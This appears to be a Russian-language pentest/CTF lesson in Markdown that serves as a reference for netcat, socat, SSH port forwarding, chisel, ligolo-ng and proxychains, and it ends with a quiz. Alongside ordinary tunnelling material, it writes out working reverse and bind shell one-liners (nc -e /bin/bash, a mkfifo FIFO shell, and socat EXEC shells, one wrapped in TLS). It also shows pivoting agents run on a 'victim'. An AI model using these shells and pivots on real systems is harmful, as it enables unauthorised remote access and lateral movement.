---
id: network-tool-nc-socat-ssh
title: "netcat, socat и SSH-туннели: соединения, релеи и pivoting"
category: network
parent: network-ssh-tunnel
difficulty: medium
order: 1
tags: [network, netcat, socat, ssh, tunnel, pivot, reference]
prerequisites: [network-ssh-tunnel, network-tunneling]
useful_for:
  - "CTF: категория Network / Pentest"
  - "Пентест: доступ к внутренним сервисам, pivoting"
  - "Работа: диагностика соединений"
estimated_minutes: 40
summary: "Полный справочник: netcat (слушатели, шеллы, передача файлов), socat (релеи, туннели), SSH-пробросы и pivoting через chisel/ligolo."
---

Когда у вас есть хоть один доступ к сети, дальше всё решают соединения: подключиться к внутреннему сервису, пробросить порт, поднять реверс-шелл, сделать прокси до изолированного сегмента. Этот урок — справочник по «рабочим лошадкам» соединений: **netcat**, **socat**, **SSH-туннели** и инструментам pivoting (**chisel**, **ligolo-ng**, **proxychains**).

## netcat: базовый синтаксис и варианты

Существует три основных «нетката», и они различаются флагами:

- **OpenBSD nc** (`/usr/bin/nc` на BSD/macOS, часто и в Linux) — эталонный, без `-e`.
- **GNU netcat** (`netcat-traditional`) — поддерживает `-e`.
- **ncat** (из nmap) — расширенный: `-e`, SSL, keep-open, allow-списки.

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-l` | Слушать (listen) | `nc -l 4444` |
| `-v` | Verbose | `nc -v 10.0.0.5 80` |
| `-n` | Не резолвить имена/порты | `nc -n 10.0.0.5 80` |
| `-p <port>` | Локальный/source-порт | `nc -p 40000 10.0.0.5 80` |
| `-s <ip>` | Исходный адрес | `nc -s 10.0.0.9 10.0.0.5 80` |
| `-u` | UDP | `nc -u 10.0.0.5 53` |
| `-z` | Zero-I/O: только проверка портов | `nc -zv 10.0.0.5 1-1024` |
| `-w <sec>` | Таймаут connect/final read | `nc -w 3 10.0.0.5 80` |
| `-q <sec>` | Выйти через N сек после EOF | `nc -q 2 10.0.0.5 80` |
| `-k` | Не закрываться после первого соединения | `nc -lk 4444` |
| `-C` | Слать CRLF как перевод строки | `nc -C 10.0.0.5 80` |
| `-N` | Закрыть сокет после EOF на stdin | `nc -N 10.0.0.5 80` |
| `-4` / `-6` | Только IPv4 / IPv6 | `nc -6 ::1 80` |
| `-b` | Разрешить broadcast | `nc -b -u 255.255.255.255 9` |
| `-D` | Debug socket option | `nc -D 10.0.0.5 80` |
| `-d` | Detach от stdin (фон) | `nc -d 10.0.0.5 80` |
| `-F` | Передать socket fd | `nc -F 10.0.0.5 80` |
| `-I <len>` | Размер TCP receive buffer | `nc -I 1024 10.0.0.5 80` |
| `-O <len>` | Размер TCP send buffer | `nc -O 1024 10.0.0.5 80` |
| `-i <sec>` | Задержка между строками/портами | `nc -i 1 -zv 10.0.0.5 1-100` |
| `-M <ttl>` | Исходящий TTL | `nc -M 64 10.0.0.5 80` |
| `-m <minttl>` | Мин. входящий TTL | `nc -m 10 10.0.0.5 80` |
| `-r` | Случайный порядок портов | `nc -r -zv 10.0.0.5 1-100` |
| `-S` | TCP MD5 signature | `nc -S 10.0.0.5 80` |
| `-T <keyword>` | Значение TOS | `nc -T lowdelay 10.0.0.5 80` |
| `-t` | Отвечать на TELNET-негоциацию | `nc -t 10.0.0.5 23` |
| `-U` | UNIX-domain socket | `nc -U /tmp/sock` |
| `-V <rtable>` | Альтернативная таблица маршрутов | `nc -V 2 10.0.0.5 80` |
| `-W <n>` | Завершить после N принятых пакетов | `nc -W 1 10.0.0.5 80` |
| `-X <proto>` | Прокси-протокол (`4`,`4A`,`5`,`connect`) | `nc -X 5 -x 127.0.0.1:9050 10.0.0.5 80` |
| `-x <addr[:port]>` | Адрес прокси | `nc -X 5 -x 127.0.0.1:9050 target 80` |
| `-P <user>` | Пользователь для прокси-аутентификации | `nc -P user -x proxy:1080 t 80` |
| `-Z` | Режим DCCP | `nc -Z 10.0.0.5 80` |
| `-e <cmd>` | Выполнить программу (GNU/ncat; в OpenBSD удалён) | `nc -e /bin/bash 10.0.0.9 4444` |
| `--ssl` | TLS (только ncat) | `ncat --ssl 10.0.0.5 443` |
| `--allow <host>` | Ограничить источник (ncat) | `ncat -l --allow 10.0.0.9 4444` |
| `--keep-open` | Не закрываться (ncat) | `ncat -l --keep-open 4444` |

Базовые соединения:

```bash
nc -lvnp 4444              # слушать на 4444 (GNU/ncat)
nc -l 4444                 # слушать (OpenBSD)
nc 10.0.0.5 80             # подключиться
nc -zv 10.0.0.5 20-25      # просканировать порты 20-25
nc -u 10.0.0.5 53          # UDP
```

## netcat: практические рецепты (шеллы, файлы, порты)

**Проверить, открыт ли порт (без записи данных):**

```bash
nc -zv 10.0.0.5 1-1024
nc -zv -w1 10.0.0.5 80,443,8080
```

**HTTP-запрос вручную (без curl):**

```bash
printf 'GET / HTTP/1.0\r\nHost: example.com\r\n\r\n' | nc -w 3 example.com 80
```

**Передача файла (отправка → приём):**

```bash
# принимающая сторона
nc -lvnp 4444 > received.bin
# отправитель
nc 10.0.0.5 4444 < secret.bin
```

**Реверс-шелл (жертва подключается к вам):**

```bash
# слушаем на атакующем
nc -lvnp 4444
# на цели (GNU netcat)
nc -e /bin/bash 10.0.0.9 4444
# на цели (OpenBSD nc без -e) — через FIFO
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.0.9 4444 > /tmp/f
```

**Бинд-шелл (жертва слушает, вы подключаетесь):**

```bash
# на цели
nc -lvnp 4444 -e /bin/bash
# с атакующего
nc 10.0.0.5 4444
```

`-e` вырезан во многих дистрибутивах (OpenBSD nc). Тогда используйте FIFO-трюк выше, ncat (`ncat -e`), или socat (см. ниже).

**Стабилизировать шелл до полноценного TTY:**

```bash
# в пойманном шелле
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z, затем в своём терминале:
stty raw -echo; fg
# в шелле:
export TERM=xterm; stty rows 40 cols 120
```

## socat: базовый синтаксис

`socat` — «netcat на стероидах»: соединяет два адреса (канала) любой природы. Синтаксис:

```bash
socat [опции] АДРЕС1 АДРЕС2
```

Адреса: `TCP-LISTEN:4444`, `TCP:host:port`, `UDP:...`, `UNIX-LISTEN:/tmp/s`, `EXEC:/bin/bash`, `SYSTEM:"cmd"`, `OPEN:/file`, `PTY,raw,echo=0`, `STDIN`/`STDOUT`, `SOCKS4:...`, `PROXY:host:port`. Опции: `fork` (несколько соединений), `reuseaddr`, `bind=`, `range=`, `retry`, `keepalive`, `ssl`/`openssl`, `verify=0`.

### socat: адреса (каналы) — таблица

| Адрес | Что это | Пример |
|-------|---------|--------|
| `TCP4-LISTEN:<port>` | Слушать TCP (IPv4) | `socat TCP4-LISTEN:4444,fork -` |
| `TCP4:<host>:<port>` | Подключиться по TCP | `socat - TCP4:10.0.0.5:80` |
| `TCP6-LISTEN:<port>` | Слушать TCP (IPv6) | `socat TCP6-LISTEN:4444,fork -` |
| `UDP-LISTEN:<port>` | Слушать UDP | `socat UDP-LISTEN:5353,fork -` |
| `UDP:<host>:<port>` | UDP-соединение | `socat - UDP:8.8.8.8:53` |
| `UNIX-LISTEN:<path>` | Слушать UNIX-сокет | `socat UNIX-LISTEN:/tmp/s,fork -` |
| `UNIX-CONNECT:<path>` | Подключиться к UNIX-сокету | `socat - UNIX-CONNECT:/tmp/s` |
| `EXEC:<cmd>` | Выполнить программу | `socat TCP-LISTEN:4444,fork EXEC:/bin/bash` |
| `SYSTEM:<cmd>` | Выполнить через shell | `socat TCP-LISTEN:4444,fork SYSTEM:"id"` |
| `OPEN:<file>` | Открыть файл как канал | `socat - OPEN:/etc/passwd` |
| `CREATE:<file>` | Создать файл | `socat - CREATE:/tmp/out.bin` |
| `PTY,raw,echo=0` | Псевдотерминал | `...,pty,raw,echo=0` |
| `STDIN` / `STDOUT` / `-` | Стандартный ввод/вывод | `socat - TCP:10.0.0.5:80` |
| `SOCKS4:<proxy>:<target>:<port>` | Через SOCKS4 | `socat - SOCKS4:127.0.0.1:9050:target:80` |
| `SOCKS4A` / `SOCKS5` | Через SOCKS | `socat - SOCKS5:127.0.0.1:9050:target:80` |
| `PROXY:<proxy>:<target>:<port>` | Через HTTP-прокси | `socat - PROXY:proxy:8080:target:80` |
| `OPENSSL-LISTEN:<port>` | TLS-слушатель | `socat OPENSSL-LISTEN:4444,cert=c.pem,key=k.pem,fork -` |
| `OPENSSL:<host>:<port>` | TLS-клиент | `socat - OPENSSL:10.0.0.9:4444,verify=0` |
| `GOPENSSL:<host>:<port>` | TLS через GnuTLS | `socat - GOPENSSL:host:443` |
| `TUN:<addr>/<mask>` | TUN-интерфейс | `socat TUN:10.0.0.1/24 ...` |
| `SCTP-LISTEN:<port>` | SCTP | `socat SCTP-LISTEN:4444,fork -` |

### socat: опции — таблица

| Опция | Что делает | Пример |
|-------|-----------|--------|
| `fork` | Обслуживать несколько соединений | `TCP-LISTEN:4444,fork` |
| `reuseaddr` | Переиспользовать адрес (bind) | `TCP-LISTEN:4444,reuseaddr` |
| `reuseport` | SO_REUSEPORT | `...,reuseport` |
| `bind=<addr>` | Привязать к адресу | `bind=127.0.0.1` |
| `range=<a-b>` | Ограничить IP клиентов | `range=10.0.0.0/24` |
| `retry=<n>` | Повторять подключение | `retry=10` |
| `keepalive` | TCP keepalive | `...,keepalive` |
| `keepidle` / `keepintvl` / `keepcnt` | Параметры keepalive | `keepidle=10` |
| `crlf` | CRLF-перевод строк | `...,crlf` |
| `cr` / `nl` | Управление переводами | `...,cr` |
| `pty` | Псевдотерминал | `EXEC:/bin/bash,pty` |
| `stderr` | Подключить stderr | `...,stderr` |
| `setsid` | Новая сессия | `...,setsid` |
| `sigint` / `sighup` / `sigquit` | Проброс сигналов | `...,sigint` |
| `sane` | «Разумные» настройки tty | `...,sane` |
| `raw` / `echo=0` | Сырой tty без эха | `pty,raw,echo=0` |
| `verify=0` | Не проверять TLS-сертификат | `OPENSSL:...,verify=0` |
| `cert=` / `key=` | Сертификат и ключ | `cert=c.pem,key=k.pem` |
| `cafile=` / `capath=` | CA для проверки | `cafile=ca.pem` |
| `su=` / `sp=` | Подменить пользователя/пароль | `su=nobody` |
| `umask=<n>` | umask для UNIX-сокета | `umask=0077` |
| `nofork` | Не форкать | `...,nofork` |
| `max-children=<n>` | Лимит детей при fork | `max-children=10` |
| `tcpwrap` | Использовать tcpwrappers | `...,tcpwrap` |
| `readbytes=<n>` | Прочитать ровно N байт | `readbytes=1024` |
| `escape=<n>` | Экранирующий байт | `escape=0x1d` |
| `ignoreeof` | Не завершать по EOF | `...,ignoreeof` |

```bash
# слушать и выполнять bash на каждое подключение
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# подключиться
socat - TCP:10.0.0.5:80
```

## socat: релеи и туннели

**Реверс-шелл через socat (цель):**

```bash
socat TCP:10.0.0.9:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**Реле (проброс порта без SSH):**

```bash
# локальный 8080 -> внутренний 10.0.1.5:80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.0.1.5:80
```

**Форвард UDP:**

```bash
socat UDP-LISTEN:5353,fork UDP:8.8.8.8:53
```

**TLS-обёртка (шифрованный шелл):**

```bash
# на атакующем: сгенерировать сертификат
openssl req -newkey rsa:2048 -nodes -keyout k.pem -x509 -out c.pem -days 1 -subj /CN=x
socat OPENSSL-LISTEN:4444,cert=c.pem,key=k.pem,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# на цели
socat OPENSSL:10.0.0.9:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**Файл как канал (для изолированных окружений):**

```bash
socat UNIX-LISTEN:/tmp/sock,fork EXEC:/bin/bash,pty,stderr
```

## SSH: локальный, удалённый и динамический проброс

SSH умеет три вида перенаправления — это ядро pivoting.

| Вид | Команда | Смысл |
|-----|---------|-------|
| Локальный | `ssh -L 8080:10.0.1.5:80 user@jump` | Локальный порт → удалённый адрес через jump |
| Удалённый | `ssh -R 8080:10.0.1.5:80 user@vps` | Порт на удалённом хосте → локальный адрес |
| Динамический | `ssh -D 9050 user@jump` | SOCKS-прокси на локальном порту |

```bash
# локальный проброс: у вас на 127.0.0.1:8080 откроется внутренний 10.0.1.5:80
ssh -N -L 8080:10.0.1.5:80 user@jump.example.com

# пробросить несколько портов сразу
ssh -N -L 8080:10.0.1.5:80 -L 3389:10.0.1.6:3389 user@jump

# удалённый проброс: на VPS откроется порт, ведущий к вашему локальному сервису
ssh -N -R 9000:127.0.0.1:80 user@vps.example.com

# динамический SOCKS5
ssh -N -D 9050 user@jump
```

### SSH: полная таблица флагов

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `-L [bind:]p:host:port` | Локальный проброс | `ssh -L 8080:10.0.1.5:80 jump` |
| `-R [bind:]p:host:port` | Удалённый проброс | `ssh -R 9000:127.0.0.1:80 vps` |
| `-D [bind:]port` | Динамический SOCKS-прокси | `ssh -D 9050 jump` |
| `-W <host:port>` | Stdio-проброс (для ProxyCommand) | `ssh -W 10.0.1.5:22 jump` |
| `-J <dest>` | ProxyJump (цепочка прыжков) | `ssh -J user1@h1,user2@h2 h3` |
| `-N` | Не выполнять команду (только туннель) | `ssh -N -L 8080:t:80 jump` |
| `-f` | Уйти в фон | `ssh -f -N -L 8080:t:80 jump` |
| `-C` | Сжатие | `ssh -C host` |
| `-T` / `-t` | Не выделять / форсировать pty | `ssh -T host` |
| `-i <key>` | Приватный ключ | `ssh -i id_rsa host` |
| `-p <port>` | Порт | `ssh -p 2222 host` |
| `-l <user>` | Логин | `ssh -l root host` |
| `-o <opt>` | Опция конфига | `ssh -o ServerAliveInterval=30 host` |
| `-F <file>` | Свой конфиг | `ssh -F myconfig host` |
| `-G` | Показать итоговый конфиг без подключения | `ssh -G host` |
| `-g` | Разрешить удалённым хостам доступ к проброшенным портам | `ssh -g -L 8080:t:80 host` |
| `-M` / `-S <path>` | Master-режим и ControlPath (мультиплекс) | `ssh -M -S ~/.ssh/cm host` |
| `-O <cmd>` | Управление мастер-соединением (`check`, `exit`) | `ssh -O check host` |
| `-A` / `-a` | Вкл./выкл. agent-forwarding | `ssh -A host` |
| `-X` / `-Y` / `-x` | X11-forwarding (trusted) / отключить | `ssh -X host` |
| `-c <cipher>` / `-m <mac>` | Выбор шифра / MAC | `ssh -c aes256-ctr host` |
| `-w <local[:remote]>` | TUN-туннель | `ssh -w 0:0 host` |
| `-I <pkcs11>` | PKCS#11-провайдер | `ssh -I /usr/lib/pkcs11.so host` |
| `-B <iface>` / `-b <addr>` | bind interface / address | `ssh -b 10.0.0.9 host` |
| `-E <file>` | Лог в файл | `ssh -E ssh.log host` |
| `-e <char>` | Escape-символ | `ssh -e '~' host` |
| `-n` | stdin из /dev/null | `ssh -n host cmd` |
| `-q` | Тихий режим | `ssh -q host` |
| `-v` / `-vv` / `-vvv` | Verbose | `ssh -vv host` |
| `-4` / `-6` | Только IPv4 / IPv6 | `ssh -6 host` |
| `-Q <q>` | Запрос возможностей (cipher, mac, …) | `ssh -Q cipher` |
| `-V` | Версия | `ssh -V` |

## SSH: ProxyJump, ключи, устойчивые туннели

**Прыжок через несколько хостов:**

```bash
ssh -J user1@host1,user2@host2 user3@host3
# то же через конфиг:
ssh -o ProxyCommand='ssh -W %h:%p user1@host1' user2@host2
```

**~/.ssh/config — удобно для повторяющихся туннелей:**

```text
Host jump
    HostName jump.example.com
    User user
    IdentityFile ~/.ssh/id_ed25519
    ServerAliveInterval 30
    ServerAliveCountMax 3
    ExitOnForwardFailure yes

Host inner
    HostName 10.0.1.5
    User root
    ProxyJump jump
```

**Устойчивый фоновый туннель:**

```bash
ssh -f -N -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes \
    -L 8080:10.0.1.5:80 user@jump
```

**Multiplexing (один TCP-канал для многих сессий):**

```bash
ssh -o ControlMaster=auto -o ControlPath=~/.ssh/cm-%r@%h:%p -o ControlPersist=10m user@jump
```

`autossh` переподнимает туннель при обрыве: `autossh -M 0 -f -N -L 8080:10.0.1.5:80 user@jump`.

## Pivoting: chisel и ligolo-ng

Когда SSH на промежуточном хосте недоступен, работают HTTP-туннели.

**chisel** (один бинарник, HTTP + SOCKS):

```bash
# атакующий: сервер (для reverse-туннеля)
chisel server -p 8080 --reverse

# жертва: подключается и открывает SOCKS на атакующем
chisel client 10.0.0.9:8080 R:socks

# или проброс конкретного порта с жертвы наружу
chisel client 10.0.0.9:8080 R:8080:127.0.0.1:80

# forward-вариант (локальный порт -> цель в сети жертвы)
chisel client 10.0.0.9:8080 L:8080:10.0.1.5:80
```

**ligolo-ng** (TUN-интерфейс, полноценная маршрутизация):

```bash
# атакующий: прокси-сервер
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# жертва: агент
./agent -connect 10.0.0.9:11601 -ignore-cert

# в консоли прокси:
session            # выбрать сессию
ifconfig           # узнать внутренние сети
start              # поднять туннель
# на атакующем добавить маршрут к внутренней сети:
sudo ip route add 10.0.1.0/24 dev ligolo
```

ligolo даёт прозрачный доступ к внутренним подсетям без SOCKS-обвязки.

## Прокси-цепочки: proxychains

`proxychains` заставляет любой TCP-инструмент идти через SOCKS/HTTP-прокси — идеально поверх `ssh -D` или `chisel R:socks`.

Конфиг `~/.proxychains/proxychains.conf`:

```text
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 9050
```

Использование:

```bash
proxychains4 -q nmap -sT -Pn -p 445 10.0.1.5
proxychains4 -q curl http://10.0.1.5/
proxychains4 -q crackmapexec smb 10.0.1.0/24
```

Важно: `nmap` через proxychains работает только в режиме `-sT` (connect) — SOCKS не умеет raw-пакеты.

## Практические рецепты (pivot в пентесте)

**У вас SSH-доступ к jump, нужно дойти до внутреннего веба:**

```bash
ssh -N -f -L 8080:10.0.1.5:80 user@jump
curl http://127.0.0.1:8080/
```

**Полный SOCKS-доступ во внутреннюю сеть:**

```bash
ssh -N -f -D 9050 user@jump
proxychains4 -q nmap -sT -Pn -p 22,80,443,445,3389 10.0.1.0/24
```

**Нет SSH, есть RCE — поднимаем chisel:**

```bash
# атакующий
./chisel server -p 8000 --reverse
# цель (загрузили бинарник)
./chisel client 10.0.0.9:8000 R:socks
# атакующий
proxychains4 -q nmap -sT -Pn -p 80 10.0.1.5
```

**Проверить достижимость внутреннего хоста без полного прокси:**

```bash
# netcat через SSH stdio-проброс
ssh -o ProxyCommand='ssh -W %h:%p user@jump' user@10.0.1.5
```

**Поднять реверс-шелл из сети без исходящих SSH:**

```bash
# атакующий
nc -lvnp 4444
# цель (socat, если nc без -e)
socat TCP:10.0.0.9:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

## Частые ошибки

- **Ждать `-e` от OpenBSD nc.** В большинстве дистрибутивов его нет — используйте FIFO-трюк, ncat или socat.
- **Путать `-l` и `-p` между версиями.** В OpenBSD `nc -l 4444`, в GNU `nc -lvnp 4444`. Проверяйте `nc -h`.
- **nmap через proxychains в `-sS`.** SOCKS не поддерживает raw-сокеты — только `-sT -Pn`.
- **Забыть `ExitOnForwardFailure`/`ServerAliveInterval`.** Туннель тихо отвалится; используйте эти опции или `autossh`.
- **`-D` на чужом порту.** По умолчанию SOCKS слушает только localhost — если нужен доступ другим хостам, задавайте `bind_address` в ssh-конфиге осознанно.

## Квиз

```quiz
- question: "Какая команда поднимает динамический SOCKS-прокси через SSH?"
  options:
    - "ssh -N -D 9050 user@host"
    - "ssh -N -L 9050:target:80 user@host"
    - "ssh -N -R 9050:target:80 user@host"
    - "ssh -N -W 9050 user@host"
  answer: 0
  explanation: "-D включает динамическое перенаправление (SOCKS) на локальном порту 9050."
- question: "Что делает команда ssh -L 8080:10.0.1.5:80 user@jump?"
  options:
    - "Открывает локальный 8080, ведущий к 10.0.1.5:80 через jump"
    - "Открывает порт 8080 на jump"
    - "Поднимает SOCKS-прокси"
    - "Копирует файл на jump"
  answer: 0
  explanation: "Локальный проброс: локальный порт 8080 туннелируется до 10.0.1.5:80 глазами хоста jump."
- question: "Почему nmap через proxychains нужно запускать с -sT?"
  options:
    - "SOCKS не передаёт raw-пакеты, поэтому нужен полный connect"
    - "Так скан быстрее"
    - "Так определяется ОС"
    - "Иначе не сохранится вывод"
  answer: 0
  explanation: "SOCKS работает на уровне потоков данных; SYN-скан с raw-пакетами невозможен — только TCP connect."
- question: "Как запустить реверс-шелл через socat на цели?"
  options:
    - "socat TCP:ATTACKER:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
    - "socat TCP-LISTEN:4444 EXEC:/bin/bash"
    - "socat OPEN:file TCP:ATTACKER:4444"
    - "socat STDIN TCP:ATTACKER:4444"
  answer: 0
  explanation: "socat соединяет канал TCP до атакующего с локальным bash, отдавая полноценный pty."
- question: "Чем ligolo-ng отличается от chisel при pivoting?"
  options:
    - "ligolo поднимает TUN-интерфейс и даёт прозрачную маршрутизацию в подсети"
    - "ligolo работает только по SSH"
    - "chisel не умеет SOCKS"
    - "ligolo не требует агента на цели"
  answer: 0
  explanation: "ligolo создаёт виртуальный сетевой интерфейс, поэтому к внутренним сетям ходят обычные инструменты без прокси-обвязки."
```

## Где пригодится

- **CTF:** Network/Pentest — подключение к сервисам, реверс-шеллы, pivot во внутренние сегменты.
- **Пентест:** доступ к внутренним сервисам, SOCKS-прокси, распределение трафика через прокси-цепочки.
- **Работа:** диагностика соединений (`nc -zv`), безопасные туннели для удалённого доступа.
